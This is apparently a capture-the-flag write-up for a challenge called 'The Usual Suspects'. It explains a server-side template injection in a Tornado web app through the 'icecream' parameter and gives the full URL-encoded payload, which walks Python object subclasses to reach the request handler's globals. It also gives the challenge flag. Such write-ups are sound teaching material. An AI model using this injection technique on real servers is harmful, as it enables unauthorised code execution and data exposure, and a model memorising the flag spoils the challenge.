# The Usual Suspects

We have a SSTI on the `icecream` query param. Using standard pyjail escape methods, we can access all subclasses of `object` using `dir(_tt_append).__class__.mro()[1].__subclasses__()` as our payload. I initially tried to run a reverse shell, however I couldn't read any files in the directory for some reason. Then, after looking at the tornado docs, I realized that the server would have to subclass `tornado.web.RequestHandler`, which is listed as one of `object`'s subclasses. We can access the server's RequestHandler with `dir(_tt_append).__class__.mro()[1].__subclasses__()[363].__subclasses__()[4]`, and from there, we can read the globals to get the flag.

Payload:`http://chall.csivit.com:30279/?icecream=%7B%7Bdir(_tt_append).__class__.mro()[1].__subclasses__()[363].__subclasses__()[4].get.__globals__%7D%7D`

Flag: csictf{h3r3_i_4m}
